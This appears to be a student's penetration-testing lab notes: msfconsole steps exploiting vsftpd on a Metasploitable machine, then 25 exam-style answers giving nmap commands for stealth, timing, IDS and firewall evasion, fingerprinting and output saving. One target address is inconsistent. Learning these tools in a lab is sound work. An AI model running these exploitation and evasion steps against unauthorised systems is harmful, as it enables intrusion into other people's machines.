ON METASPLOIT MACHINE
1 - msfadmin
    msfadmin

2 - ifconfig
    192.168.1.3


ON KALI LINUS MACHINE

1 - msfconsole
2 - nmap -sV 192.168.1.3
3 - search vsftpd
4 - use 1
5 - options 
6 - set rhosts 198.168.1.3
7 - options
8 - run
9 - whoami


Q1. Silent Recon Scenario

Goal: Avoid ICMP + extremely slow scan

Commands:

nmap -Pn -sn -T0 <target_network>
nmap -Pn -sS -T0 <vulnerable_machine_ip>


Why this works:

-Pn → skips ICMP ping (no ping logging)

-sn → host discovery only

-sS → stealth SYN scan

-T0 → slowest timing (paranoid)

Q2. Incident Response Constraint

Fastest possible scan (2 minutes):

nmap -T5 -F <vulnerable_machine_ip>


Why it’s noisy:

-T5 sends packets very fast

IDS easily detects aggressive bursts

High chance of alerts and logs

Q3. Evidence Collection Case

Command:

nmap <vulnerable_machine_ip> -oA evidence_scan


Files generated:

evidence_scan.nmap

evidence_scan.gnmap

evidence_scan.xml

Q4. Blue Team Restriction

Disable DNS + balanced speed:

nmap -n -T3 <vulnerable_machine_ip>


Why:

-n avoids DNS delays

-T3 is normal speed (not noisy)

Q5. Forensic Analysis Task

Machine-readable XML only:

nmap scanme.nmap.org -oX scanme.xml

Q6. Classroom Lab Challenge

Live hosts only + moderate speed:

nmap -sn -T3 192.168.56.0/24 -oN live_hosts.txt

Q7. Stealth vs Speed Comparison

Stealth scan:

nmap -sS -T1 <vulnerable_machine_ip>


Very fast scan:

nmap -sS -T5 <vulnerable_machine_ip>


Detection risk difference:

T1 → low detection, slow

T5 → high detection, fast

Q8. Logging Failure Scenario

Redo scan + save output:

nmap <vulnerable_machine_ip> -oN result.txt

Q9. Real-World Penetration Test

One command fulfilling all requirements:

nmap -T4 -n -oA pentest_scan <vulnerable_machine_ip>

Q10. Trick Question (Viva Favorite)

Answer: -T0 (Paranoid)

Reason:

Sends packets extremely slowly

Mimics normal traffic

Least IDS detection

Time is not a concern

Q11. Firewall Evasion Scenario

Assume host is alive:

nmap -Pn <vulnerable_machine_ip>


Why it works:

Skips ICMP ping

Directly scans ports even if ping blocked

Q12. Selective Port Investigation
nmap -p 21,22,80 -sV <vulnerable_machine_ip>

Q13. Full Exposure Assessment
nmap -sS -p- -T2 <vulnerable_machine_ip>

Q14. Service Enumeration Challenge
nmap -p 22,80,443 -sV <vulnerable_machine_ip>

Q15. Operating System Fingerprinting
nmap -O <vulnerable_machine_ip>


Option used: -O

Q16. Aggressive Reconnaissance
nmap -A <vulnerable_machine_ip>


Detects:

OS

Services

Versions

Default scripts

Q17. UDP Risk Assessment
nmap -sU <vulnerable_machine_ip>


Why UDP scans are slower:

No handshake

Nmap waits for timeouts

Packet loss increases delay

Q18. Subnet Asset Discovery
nmap -sn 192.168.1.0/24 -oN subnet_hosts.txt

Q19. Scan Optimization Case
nmap -sS -T3 <vulnerable_machine_ip>


Justification:

T3 balances speed and stealth

Q20. Examiner’s Trick Question

Stealthier scan:

nmap -sS <vulnerable_machine_ip>


Technical difference:

-sS → Half-open SYN scan

-sT → Full TCP connect (logged)

Q21. Script-Based Enumeration
nmap -sC <vulnerable_machine_ip>

Q22. Path Discovery
nmap --traceroute <vulnerable_machine_ip>

Q23. Scan From File
nmap -iL targets.txt

Q24. Performance vs Accuracy
nmap --max-retries 5 <vulnerable_machine_ip>


Option used: --max-retries

Q25. Real-World Lab Mix
nmap -sS -sV -n -oA final_scan <vulnerable_machine_ip>
